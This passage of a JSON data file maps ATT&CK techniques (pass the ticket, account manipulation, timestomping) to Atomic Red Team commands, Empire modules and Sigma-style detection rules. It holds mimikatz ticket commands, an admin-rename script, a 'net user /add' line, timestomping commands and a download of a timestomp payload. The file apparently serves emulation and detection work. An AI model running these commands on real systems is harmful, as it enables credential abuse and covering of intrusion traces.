"commands": [{"source": "atomics/T1097/T1097.yaml", "command": "mimikatz # kerberos::ptt Administrator@#{domain}\n", "name": null}, {"source": "atomics/T1097/T1097.yaml", "command": "mimikatz # kerberos::ptt #{user_name}@atomic.local\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Pass the Ticket": {"attack_technique": "T1097", "display_name": "Pass the Ticket", "atomic_tests": [{"name": "Mimikatz Kerberos Ticket Attack", "description": "Similar to PTH, but attacking Kerberos\n", "supported_platforms": ["windows"], "input_arguments": {"user_name": {"description": "username", "type": "string", "default": "Administrator"}, "domain": {"description": "domain", "type": "string", "default": "atomic.local"}}, "executor": {"name": "command_prompt", "command": "mimikatz # kerberos::ptt #{user_name}@#{domain}\n"}}]}}], "command_list": ["mimikatz # kerberos::ptt Administrator@#{domain}\n", "mimikatz # kerberos::ptt #{user_name}@atomic.local\n"], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows local account manipulation\ndescription: win7 test\nreferences:\ntags: T1087 / T1069\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4624 # account login\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Account domain: '. * *' # May be understood with reference to exemplary log\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4672 # Special Login\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Account domain: _ # account field is empty\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: MS14-068-PYKEK\ndescription: windows server 2008 / windows 7\nreferences: https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf\ntags: T1097\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: Security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4624 # account login\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Account Domain: '* *.' # New Registration> Account domain (under normal circumstances, account should be a domain ABC, when there KEKEO attack, the account domain ABC.COM)\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4672 # administrator login\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Account Domain: # accounts domain (under normal circumstances, account should be a domain ABC, when there KEKEO attack, the account field is empty)\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4768 #Kerberos TGS request\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Supplied Realm Name: '* *.' # Field names provided (under normal circumstances, provide the name of the field should be ABC, when there KEKEO attack, the field name has been provided for the ABC.COM)\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: MS14-068-PYKEK\ndescription: windows server 2008 / windows 7\nreferences: https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/golden_ticket.md\ntags: T1097\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: Security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4624 # account login\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Account Domain: '* *.' # New Registration> Account domain (under normal circumstances, account should be a domain ABC, when there PYKEK attack, the account domain ABC.COM)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Account Name: '*' # new login> account name (different from the account security identification of this condition are complex to implement)\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4672 # administrator login\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Account Domain: '* *.' # Account field (under normal circumstances, should account field ABC, when present PYKEK attack domain account ABC.COM)\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4768 #Kerberos TGS request\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Supplied Realm Name: '* *.' # Field names provided (under normal circumstances, provide the name of the field should be ABC, when there PYKEK attack, the field name has been provided for the ABC.COM)\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1098", "commands": [{"source": "atomics/T1098/T1098.yaml", "command": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHaHa_$x$y$z$w\n\n$hostname = (Get-CIMInstance CIM_ComputerSystem).Name\n\n$fmm = Get-CimInstance -ClassName win32_group -Filter \"name = 'Administrators'\" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        Rename-LocalUser -Name $member.Name -NewName \"HaHaHa_$x$y$z$w\"\n        Write-Host \"Successfully Renamed Administrator Account on\" $hostname\n        }\n    }\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/honeyhash", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/honeyhash", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/set_ad_object", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/set_ad_object", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> net user test321 Test.321 / add\nThe command completed successfully.", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> net user test321 Test.321 / add\nThe command completed successfully.", "name": "Dos"}], "parsed_datasets": [{"Atomic Red Team Test - Account Manipulation": {"attack_technique": "T1098", "display_name": "Account Manipulation", "atomic_tests": [{"name": "Admin Account Manipulate", "description": "Manipulate Admin Account Name\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHaHa_$x$y$z$w\n\n$hostname = (Get-CIMInstance CIM_ComputerSystem).Name\n\n$fmm = Get-CimInstance -ClassName win32_group -Filter \"name = 'Administrators'\" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        Rename-LocalUser -Name $member.Name -NewName \"HaHaHa_$x$y$z$w\"\n        Write-Host \"Successfully Renamed Administrator Account on\" $hostname\n        }\n    }\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/honeyhash", "ATT&CK Technique #1": "T1098", "ATT&CK Technique #2": "", "Technique": "Account Manipulation", "Concatenate for Python Dictionary": "\"powershell/management/honeyhash\":  [\"T1098\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/set_ad_object", "ATT&CK Technique #1": "T1098", "ATT&CK Technique #2": "", "Technique": "Account Manipulation", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/set_ad_object\":  [\"T1098\"],"}}], "command_list": ["$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHaHa_$x$y$z$w\n\n$hostname = (Get-CIMInstance CIM_ComputerSystem).Name\n\n$fmm = Get-CimInstance -ClassName win32_group -Filter \"name = 'Administrators'\" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        Rename-LocalUser -Name $member.Name -NewName \"HaHaHa_$x$y$z$w\"\n        Write-Host \"Successfully Renamed Administrator Account on\" $hostname\n        }\n    }\n", "powershell/management/honeyhash", "powershell/management/honeyhash", "powershell/situational_awareness/network/powerview/set_ad_object", "powershell/situational_awareness/network/powerview/set_ad_object", "Dos\nC: \\ Windows \\ system32> net user test321 Test.321 / add\nThe command completed successfully.", "Dos\nC: \\ Windows \\ system32> net user test321 Test.321 / add\nThe command completed successfully."], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows local account manipulation\ndescription: win7 test\nreferences:\ntags: T1087 / T1069\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ * \\ net.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tokenpromotiontype: TokenElevationTypeFull (2)\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ * \\ net1.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tokenpromotiontype: TokenElevationTypeFull (2)\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4656 # has been requested to handle objects\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ObjectServer: 'Security Account Manager' # Object> Object Server\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: 'SAM_DOMAIN' # Object> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: 'C: \\ Windows \\ System32 \\ lsass.exe' # process> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Access: 'CreateUser'\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4728 # has enabled global security group to add a member.\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4720 # user account has been created.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SecurityID: '*' # new account> Security ID\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Accountname: '*' # new account> account name\n\u00a0\u00a0\u00a0\u00a0selection6:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4722 #-enabled user accounts.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Security ID: '*' # target account> Security ID\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Accountname: '*' # target account> account name\n\u00a0\u00a0\u00a0\u00a0selection7:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4738 # Changed user account.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Security ID: '*' # target account> Security ID\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Accountname: '*' # target account> account name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 20s\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: Windows-AdminSDHolder\ndescription: Windows server 2008 R2 (AD domain controller)\nreferences: https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md OR https://github.com/0Kee-Team/WatchAD/blob/master/modules/detect/event_log/ persistence / AdminSDHolder.py\ntags: 1098\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5136 # directory service object was modified. AdminSDHolder change, as a general authority to maintain, because the situation changes very little\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4780 #ACL provided on a member of the Administrators group account\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1h # default wait 60 minutes to take effect, the specific reasons described below with reference may SDPROP\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows local account manipulation\ndescription: win7 test\ntags: T1087 / T1069\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ * \\ net.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tokenpromotiontype: TokenElevationTypeFull (2)\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 #'ve created a new process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ * \\ net1.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tokenpromotiontype: TokenElevationTypeFull (2)\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4656 # has been requested to handle objects\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ObjectServer: 'Security Account Manager' # Object> Object Server\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: 'SAM_DOMAIN' # Object> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processname: 'C: \\ Windows \\ System32 \\ lsass.exe' # process> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Access: 'CreateUser'\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4728 # has enabled global security group to add a member.\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4720 # user account has been created.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SecurityID: '*' # new account> Security ID\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Accountname: '*' # new account> account name\n\u00a0\u00a0\u00a0\u00a0selection6:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4722 #-enabled user accounts.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Security ID: '*' # target account> Security ID\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Accountname: '*' # target account> account name\n\u00a0\u00a0\u00a0\u00a0selection7:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4738 # Changed user account.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Security ID: '*' # target account> Security ID\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Accountname: '*' # target account> account name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 20s\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Active Directory User Backdoors", "id": "300bac00-e041-4ee2-9c36-e262656a6ecc", "description": "Detects scenarios where one can control another users or computers account without having to use their credentials.", "references": ["https://msdn.microsoft.com/en-us/library/cc220234.aspx", "https://adsecurity.org/?p=3466", "https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/"], "author": "@neu5ron", "tags": ["attack.t1098", "attack.credential_access", "attack.persistence"], "logsource": {"product": "windows", "service": "security", "definition1": "Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management", "definition2": "Requirements: Audit Policy : DS Access > Audit Directory Service Changes, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\DS Access\\Audit Directory Service Changes"}, "detection": {"selection1": {"EventID": 4738}, "filter1": {"AllowedToDelegateTo": null}, "filter2": {"AllowedToDelegateTo": "-"}, "selection2": {"EventID": 5136, "AttributeLDAPDisplayName": "msDS-AllowedToDelegateTo"}, "selection3": {"EventID": 5136, "ObjectClass": "user", "AttributeLDAPDisplayName": "servicePrincipalName"}, "selection4": {"EventID": 5136, "AttributeLDAPDisplayName": "msDS-AllowedToActOnBehalfOfOtherIdentity"}, "condition": "(selection1 and not 1 of filter*) or selection2 or selection3 or selection4"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Password Change on Directory Service Restore Mode (DSRM) Account", "id": "53ad8e36-f573-46bf-97e4-15ba5bf4bb51", "status": "stable", "description": "The Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers. Attackers may change the password to gain persistence.", "references": ["https://adsecurity.org/?p=1714"], "author": "Thomas Patzke", "tags": ["attack.persistence", "attack.privilege_escalation", "attack.t1098"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4794}, "condition": "selection"}, "falsepositives": ["Initial installation of a domain controller"], "level": "high"}}]}, {"technique_id": "T1099", "commands": [{"source": "atomics/T1099/T1099.yaml", "command": "touch -a -t 197001010000.00 /opt/filename\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "touch -m -t 197001010000.00 /opt/filename\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "NOW=$(date)\ndate -s \"1970-01-01 00:00:00\"\ntouch /opt/filename\ndate -s \"$NOW\"\nstat /opt/filename\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "touch -acmr /bin/sh #{target_file_path}\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "touch -acmr #{reference_file_path} /opt/filename\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "Get-ChildItem $env:TEMP\\T1099_timestomp.txt | % { $_.CreationTime = \"#{target_date_time}\" }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "Get-ChildItem #{file_path} | % { $_.CreationTime = \"1970-01-01 00:00:00\" }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "Get-ChildItem $env:TEMP\\T1099_timestomp.txt | % { $_.LastWriteTime = \"#{target_date_time}\" }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "Get-ChildItem #{file_path} | % { $_.LastWriteTime = \"1970-01-01 00:00:00\" }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "Get-ChildItem $env:TEMP\\T1099_timestomp.txt | % { $_.LastAccessTime = \"#{target_date_time}\" }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "Get-ChildItem #{file_path} | % { $_.LastAccessTime = \"1970-01-01 00:00:00\" }\n", "name": null}, {"source": "atomics/T1099/T1099.yaml", "command": "import-module $env:appdata\\Microsoft\\timestomp.ps1\ntimestomp -dest \"$env:appdata\\Microsoft\\kxwn.lock\"\n \n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/timestomp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/timestomp", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Timestomp": {"attack_technique": "T1099", "display_name": "Timestomp", "atomic_tests": [{"name": "Set a file's access timestamp", "description": "Stomps on the access timestamp of a file\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"target_filename": {"description": "Path of file that we are going to stomp on last access time", "type": "Path", "default": "/opt/filename"}}, "executor": {"name": "sh", "command": "touch -a -t 197001010000.00 #{target_filename}\n"}}, {"name": "Set a file's modification timestamp", "description": "Stomps on the modification timestamp of a file\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"target_filename": {"description": "Path of file that we are going to stomp on last access time", "type": "Path", "default": "/opt/filename"}}, "executor": {"name": "sh", "command": "touch -m -t 197001010000.00 #{target_filename}\n"}}, {"name": "Set a file's creation timestamp", "description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"target_filename": {"description": "Path of file that we are going to stomp on last access time", "type": "Path", "default": "/opt/filename"}}, "executor": {"name": "sh", "command": "NOW=$(date)\ndate -s \"1970-01-01 00:00:00\"\ntouch #{target_filename}\ndate -s \"$NOW\"\nstat #{target_filename}\n"}}, {"name": "Modify file timestamps using reference file", "description": "Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.\n\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"reference_file_path": {"description": "Path of reference file to read timestamps from", "type": "Path", "default": "/bin/sh"}, "target_file_path": {"description": "Path of file to modify timestamps of", "type": "Path", "default": "/opt/filename"}}, "executor": {"name": "sh", "command": "touch -acmr #{reference_file_path} #{target_file_path}\n"}}, {"name": "Windows - Modify file creation timestamp with PowerShell", "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "Path of file to change creation timestamp", "type": "Path", "default": "$env:TEMP\\T1099_timestomp.txt"}, "target_date_time": {"description": "Date/time to replace original timestamps with", "type": "String", "default": "1970-01-01 00:00:00"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "A file must exist at the path (#{file_path}) to change the creation time on\n", "prereq_command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{file_path} -Force | Out-Null\nSet-Content #{file_path} -Value \"T1099 Timestomp\" -Force | Out-Null\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-ChildItem #{file_path} | % { $_.CreationTime = \"#{target_date_time}\" }\n", "cleanup_command": "Remove-Item #{file_path} -Force -ErrorAction Ignore\n"}}, {"name": "Windows - Modify file last modified timestamp with PowerShell", "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "Path of file to change modified timestamp", "type": "Path", "default": "$env:TEMP\\T1099_timestomp.txt"}, "target_date_time": {"description": "Date/time to replace original timestamps with", "type": "String", "default": "1970-01-01 00:00:00"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "A file must exist at the path (#{file_path}) to change the modified time on\n", "prereq_command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{file_path} -Force | Out-Null\nSet-Content #{file_path} -Value \"T1099 Timestomp\" -Force | Out-Null\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-ChildItem #{file_path} | % { $_.LastWriteTime = \"#{target_date_time}\" }\n", "cleanup_command": "Remove-Item #{file_path} -Force -ErrorAction Ignore\n"}}, {"name": "Windows - Modify file last access timestamp with PowerShell", "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "Path of file to change last access timestamp", "type": "Path", "default": "$env:TEMP\\T1099_timestomp.txt"}, "target_date_time": {"description": "Date/time to replace original timestamps with", "type": "String", "default": "1970-01-01 00:00:00"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "A file must exist at the path (#{file_path}) to change the last access time on\n", "prereq_command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{file_path} -Force | Out-Null\nSet-Content #{file_path} -Value \"T1099 Timestomp\" -Force | Out-Null\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-ChildItem #{file_path} | % { $_.LastAccessTime = \"#{target_date_time}\" }\n", "cleanup_command": "Remove-Item #{file_path} -Force -ErrorAction Ignore\n"}}, {"name": "Windows - Timestomp a File", "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "File path for timestomp payload", "type": "String", "default": "$env:appdata\\Microsoft"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "timestomp.ps1 must be present in #{file_path}.\n", "prereq_command": "if (Test-Path #{file_path}\\timestomp.ps1) {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1\" -OutFile \"#{file_path}\\timestomp.ps1\"\n"}, {"description": "kxwn.lock must be present in #{file_path}.\n", "prereq_command": "if (Test-Path -path \"#{file_path}\\kxwn.lock\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{file_path}\\kxwn.lock -ItemType File\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "import-module #{file_path}\\timestomp.ps1\ntimestomp -dest \"#{file_path}\\kxwn.lock\"\n \n", "cleanup_command": "Write-Host \"Removing #{file_path}\\timestomp.ps1\"\nRemove-Item #{file_path}\\timestomp.ps1 -ErrorAction Ignore\nWrite-Host \"Removing #{file_path}\\kxwn.lock\"\nRemove-Item #{file_path}\\kxwn.lock -ErrorAction Ignore"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/timestomp", "ATT&CK Technique #1": "T1099", "ATT&CK Technique #2": "", "Technique": "Timestomp", "Concatenate for Python Dictionary": "\"powershell/management/timestomp\":  [\"T1099\"],"}}], "command_list": ["touch -a -t 197001010000.00 /opt/filename\n", "touch -m -t 197001010000.00 /opt/filename\n", "NOW=$(date)\ndate -s \"1970-01-01 00:00:00\"\ntouch /opt/filename\ndate -s \"$NOW\"\nstat /opt/filename\n", "touch -acmr /bin/sh #{target_file_path}\n", "touch -acmr #{reference_file_path} /opt/filename\n", "Get-ChildItem $env:TEMP\\T1099_timestomp.txt | % { $_.CreationTime = \"#{target_date_time}\" }\n", "Get-ChildItem #{file_path} | % { $_.CreationTime = \"1970-01-01 00:00:00\" }\n", "Get-ChildItem $env:TEMP\\T1099_timestomp.txt | % { $_.LastWriteTime = \"#{target_date_time}\" }\n", "Get-ChildItem #{file_path} | % { $_.LastWriteTime = \"1970-01-01 00:00:00\" }\n", "Get-ChildItem 